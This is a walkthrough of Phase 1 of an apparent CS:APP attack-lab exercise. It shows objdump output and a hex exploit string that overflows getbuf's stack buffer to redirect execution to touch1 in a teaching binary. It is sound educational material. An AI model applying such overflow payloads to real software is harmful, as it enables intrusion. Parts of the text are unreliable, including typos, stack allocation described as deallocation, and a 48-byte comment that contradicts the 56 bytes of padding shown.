# Phase1:

In this phase, we are trying to first overflow the stack with the exploit string, and change the address to the address of the touch1 function. In order to do this, we first need to find what the fixed buffer size is.

You will want to first do an object dump of the ctarget file so we can get everything we need for Phase 1, 2, and 3.
```
obj dump -d ctarget > Phase123dump.d
```
After getting the assembly, we can take a look at getbuf:
```
0000000000402601 <getbuf>:
  402601:	48 83 ec 38          	sub    $0x38,%rsp
  402605:	48 89 e7             	mov    %rsp,%rdi
  402608:	e8 95 02 00 00       	call   4028a2 <Gets>
  40260d:	b8 01 00 00 00       	mov    $0x1,%eax
  402612:	48 83 c4 38          	add    $0x38,%rsp
  402616:	c3                   	ret 
```
We see here that on line 5, it is deallocating space from the stack for what the bugger size is which is 0x38 or 56 bytes. So, this means that we need a buffer of 56 bytes (including the address of touch1).

Now, to look for the address of touch1 in the objdump file:
```
0000000000402617 <touch1>:
  402617:	50                   	push   %rax
  402618:	58                   	pop    %rax
  402619:	48 83 ec 08          	sub    $0x8,%rsp
  40261d:	c7 05 15 22 11 00 01 	movl   $0x1,0x112215(%rip)        # 51483c <vlevel>
  402624:	00 00 00 
  402627:	48 8d 3d 4e 9c 0d 00 	lea    0xd9c4e(%rip),%rdi        # 4dc27c <_IO_stdin_used+0x27c>
  40262e:	e8 7d 4e 01 00       	call   4174b0 <_IO_puts>
  402633:	bf 01 00 00 00       	mov    $0x1,%edi
  402638:	e8 df 04 00 00       	call   402b1c <validate>
  40263d:	bf 00 00 00 00       	mov    $0x0,%edi
  402642:	e8 79 ac 00 00       	call   40d2c0 <exit>
```
The address is 0000000000402617. So, now time to write our ctarget.l1.txt file:
```
00 00 00 00 00 00 00 00 /*Buffer. We need 48 bytes because 8 of the bytes will be used by the touch1 address*/
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
17 26 40 00 00 00 00 00 /*touch1 address. Remember, you need to put it in "backwards" or in little-endian form*/
```
Finally, in all the phases, we need to use the hex2raw file to generate the raw exploit strings:
```
./hex2raw < ctarget.l1.txt > exploit1.dat
```
And then run the raw file:
```
./ctarget < exploit1.dat
```
All done!